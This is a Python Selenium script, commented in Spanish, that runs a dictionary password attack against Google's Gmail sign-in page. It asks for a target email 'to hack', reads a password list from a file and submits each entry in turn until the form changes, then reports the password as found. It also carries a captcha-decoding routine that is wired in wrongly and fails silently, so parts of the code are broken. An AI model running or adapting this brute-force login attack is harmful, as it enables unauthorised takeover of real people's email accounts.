from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import time
from PIL import Image
import requests
from io import BytesIO
import sys

url = 'https://accounts.google.com/InteractiveLogin/signinchooser?cid=1&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%3Fhl%3Des&emr=1&flowEntry=ServiceLogin&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%3Fhl%3Des&hl=es&ifkv=ASKXGp3IYTshxN3jfccjFVqUJMBvytJ1xJWhJLaj8CHfq8jUOehDhANFh5ABaMKCMKd7lpfqGlmB&osid=1&passive=1209600&service=mail&theme=glif'
# Función para descargar la imagen desde una URL y convertirla a RGB
def download_image(url):
    response = requests.get(url)
    img = Image.open(BytesIO(response.content))
    img = img.convert("RGB")  # Convierte la imagen a RGB
    return img
def decoder(url, threshold=200, mask="letters.bmp", alphabet="0123456789abcdef"):
    img = download_image(url)  # Descarga y convierte la imagen
    img = img.convert("RGB")  # Asegúrate de que la imagen esté en formato RGB
    # ... el resto de tu código ...
    box = (8, 8, 58, 18)
    img = img.crop(box)
    pixdata = img.load()

    # open the mask
    letters = Image.open(mask)
    ledata = letters.load()

    def test_letter(img, letter):
        A = img.load()
        B = letter.load()
        mx = 1000000
        max_x = 0
        x = 0
        for x in range(img.size[0] - letter.size[0]):
            _sum = 0
            for i in range(letter.size[0]):
                for j in range(letter.size[1]):
                    _sum = _sum + abs(A[x + i, j][0] - B[i, j][0])
            if _sum < mx:
                mx = _sum
                max_x = x
        return mx, max_x

    # Clean the background noise, if color != white, then set to black.
    for y in range(img.size[1]):
        for x in range(img.size[0]):
            if (pixdata[x, y][0] > threshold) \
                    and (pixdata[x, y][1] > threshold) \
                    and (pixdata[x, y][2] > threshold):

                pixdata[x, y] = (255, 255, 255, 255)
            else:
                pixdata[x, y] = (0, 0, 0, 255)

    counter = 0
    old_x = -1

    letterlist = []

    for x in range(letters.size[0]):
        black = True
        for y in range(letters.size[1]):
            if ledata[x, y][0] != 0:
                black = False
                break
        if black:
            box = (old_x + 1, 0, x, 10)
            letter = letters.crop(box)
            t = test_letter(img, letter)
            letterlist.append((t[0], alphabet[counter], t[1]))
            old_x = x
            counter += 1

    box = (old_x + 1, 0, 140, 10)
    letter = letters.crop(box)
    t = test_letter(img, letter)
    letterlist.append((t[0], alphabet[counter], t[1]))

    t = sorted(letterlist)
    t = t[0:5]  # 5-letter captcha

    final = sorted(t, key=lambda e: e[2])

    answer = ''.join(map(lambda l: l[1], final))
    return answer


    
    
    
    
# Configura las opciones de Chrome para no cerrar el navegador automáticamente
chrome_options = Options()
chrome_options.add_experimental_option("detach", True)

# Inicializa el navegador con las opciones configuradas
driver = webdriver.Chrome(options=chrome_options)

# Abre la página web con el formulario
driver.get(url)

# Encuentra los elementos del formulario y rellénalos
email = WebDriverWait(driver, 10).until(
    EC.visibility_of_element_located((By.NAME, 'identifier'))
)
email.send_keys(input("Escribe el correo para hackear: (en mi ejemplo es: javidihack@gmail.com, y su contraseña: Solar123)"))

# Encuentra y haz clic en el botón de enviar
boton_siguiente = driver.find_element(By.XPATH, "//span[contains(text(), 'Siguiente')]")
boton_siguiente.click()

password = WebDriverWait(driver, 10).until(
	EC.visibility_of_element_located((By.NAME, 'Passwd'))
)
with open(input("Introduce la ruta del diccionario de contraseñas: "), 'r', errors='ignore') as archivo:
    passwordsList = [linea.strip() for linea in archivo]
pos = 0
while True:
	try:
		password = WebDriverWait(driver, 10).until(
			EC.visibility_of_element_located((By.NAME, 'Passwd'))
		)
		password.send_keys(passwordsList[pos])
		try:
			if __name__ == '__main__':
				print(decoder(url))
		except:
			pass
  
		# Encuentra y haz clic en el botón de enviar
		boton_siguiente = driver.find_element(By.XPATH, "//span[contains(text(), 'Siguiente')]")
		boton_siguiente.click()
		pos+=1
		time.sleep(2)		
	except NoSuchElementException:
		print(f"Contraseña encontrada!\n	La contraseña es: {passwordsList[pos-1]}")
		break

time.sleep(1)

